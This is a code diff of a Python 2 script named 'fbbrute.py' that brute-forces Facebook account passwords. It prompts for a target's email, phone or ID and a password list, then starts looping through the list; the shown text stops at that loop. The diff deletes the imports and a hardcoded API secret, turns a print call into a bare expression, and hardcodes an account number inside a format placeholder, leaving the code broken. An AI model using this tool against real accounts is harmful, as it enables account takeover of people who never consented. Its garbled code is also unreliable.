@@ -1,14 +1,7 @@
 ## fbbrute.py - Facebook Brute Force
 # -*- coding: utf-8 -*-
-##
-import os
-import sys
-import urllib
-import hashlib
 
-API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
 
-__banner__ = """
        +=======================================+
        |..........Facebook Cracker v 1.........|
        +---------------------------------------+
@@ -26,13 +19,13 @@ __banner__ = """
        +---------------------------------------+
 """
 
-print("[+] Facebook Brute Force\n")
+("[+] Facebook Brute Force\n")
 userid = raw_input("[*] Enter [Email|Phone|Username|ID]: ")
 try:
 	passlist = raw_input("[*] Set PATH to passlist: ")
 	if os.path.exists(passlist) != False:
 		print(__banner__)
-		print(" [+] Account to crack : {}".format(userid))
+		print(" [+] Account to crack : {100044822919091}".format(userid))
 		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
 		print(" [+] Cracking, please wait ...")
 		for passwd in open(passlist,'r').readlines():
